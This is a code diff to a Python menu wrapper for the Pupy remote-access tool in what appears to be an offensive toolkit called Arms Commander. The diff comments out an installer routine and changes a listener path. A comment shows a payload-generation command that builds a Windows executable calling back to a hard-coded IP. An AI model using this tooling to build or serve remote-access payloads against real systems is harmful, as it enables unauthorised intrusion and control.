@@ -32,38 +32,37 @@ print 'Plus, you can still have it interface with Metasploit if you wish'
 
 
 # The original Pupy repo has some sort of hash checksum checker too
-def install_pupy():
-    # print 'Due to various bugs I have encountered, I have decided to release a pre-installed version of Pupy with this version of Arms Commander'
-    # print 'The code is a bit modified so I can allow it to interact with a "point-and-click keyboard menu"'
-    # print 'But if you have any issues such as dependency problems, by all means type CONTINUE to have any required Python modules installed'
-
-    continue_Question = str(raw_input("Type CONTINUE (all caps) to install REQUIRED Pupy Modules: "))
-
-    if continue_Question == "CONTINUE":
-        print 'Your version of Pupy is up-to-date'
-        print 'Installing any required modules'
-        os.system('pip install -r /root/ArmsCommander/pupy/requirements.txt')
-        print 'Cloning Git Repo'
-        os.system('git clone https://github.com/n1nj4sec/pupy.git pupy')
-        os.system('cd pupy')
-        print 'Initializing submodules and updating them'
-        os.system('git submodule init')
-        os.system('git submodule update')
-        print 'Installing required pip modules'
-        os.system('pip install -r requirements.txt')
-        print 'Copying critical files to your ArmsCommander Installation'
-        os.system('cp -r ./* /root/ArmsCommander')
-        os.system('cp -r ./Pupy /root/ArmsCommander')
-        print 'Installation Complete. Run Pupy either from this menu, or from AC, #8 "Remote Exploitation" and then #6 "Pupy"'
-        main()
-        os.system('chmod 777 /root/ArmsCommander/crypto/gen.sh')
-        os.system('/root/ArmsCommander/crypto/gen.sh')
-        print 'Python module installation complete'
-        main()
-    else:
-        print 'Quitting Pupy autoinstaller'
-        main()
-    return
+# def install_pupy():
+#     # print 'Due to various bugs I have encountered, I have decided to release a pre-installed version of Pupy with this version of Arms Commander'
+#     # print 'The code is a bit modified so I can allow it to interact with a "point-and-click keyboard menu"'
+#     # print 'But if you have any issues such as dependency problems, by all means type CONTINUE to have any required Python modules installed'
+#
+#     continue_Question = str(raw_input("Type CONTINUE (all caps) to install REQUIRED Pupy Modules: "))
+#
+#     if continue_Question == "CONTINUE":
+#         print 'Your version of Pupy is up-to-date'
+#         print 'Installing any required modules'
+#         os.system('pip install -r /root/ArmsCommander/pupy/requirements.txt')
+#         print 'Cloning Git Repo'
+#         os.system('git clone https://github.com/n1nj4sec/pupy.git pupy')
+#         os.system('cd pupy')
+#         print 'Initializing submodules and updating them'
+#         os.system('git submodule init')
+#         os.system('git submodule update')
+#         print 'Installing required pip modules'
+#         os.system('pip install -r requirements.txt')
+#         print 'Copying critical files to your ArmsCommander Installation'
+#         os.system('cp -r ./* /root/ArmsCommander')
+#         print 'Installation Complete. Run Pupy either from this menu, or from AC, #8 "Remote Exploitation" and then #6 "Pupy"'
+#         main()
+#         os.system('chmod 777 /root/ArmsCommander/crypto/gen.sh')
+#         os.system('/root/ArmsCommander/crypto/gen.sh')
+#         print 'Python module installation complete'
+#         main()
+#     else:
+#         print 'Quitting Pupy autoinstaller'
+#         main()
+#     return
 
 def generate_pupy_payload():
     # python pupygen.py -f exe_x86 connect --host 52.53.180.45:443
@@ -89,7 +88,7 @@ def server_pupy():
     elif opt_Choice == "2":
         server_pupy_transport = str(raw_input("Enter your TRANSPORT (Protocol): "))
         server_pupy_port = str(raw_input("Enter your PORT: "))
-        cmd_String = "python /root/ArmsCommander/pupysh.py -t %s -p %s" % (server_pupy_transport, server_pupy_port)
+        cmd_String = "python /root/pupy/pupy/pupysh.py -t %s -p %s" % (server_pupy_transport, server_pupy_port)
         print cmd_String
         os.system(cmd_String)
     else:
@@ -99,18 +98,14 @@ def server_pupy():
 
 def main():
     opt_List = [
-        '\n\t#INSTALL. Install Pupy, Pupy Payload Generator, and Pupy Server',
-        '#1. Run Pupy Payload Generator',
+        '\n\t#1. Run Pupy Payload Generator',
         '#2. Run Pupy Listener/Server'
     ]
 
     print ("\n\t".join(opt_List))
     opt_Choice = str(raw_input(""))
 
-    if opt_Choice == "INSTALL":
-        os.system('clear')
-        install_pupy()
-    elif opt_Choice == "1":
+    if opt_Choice == "1":
         os.system('clear')
         generate_pupy_payload()
     elif opt_Choice == "2":
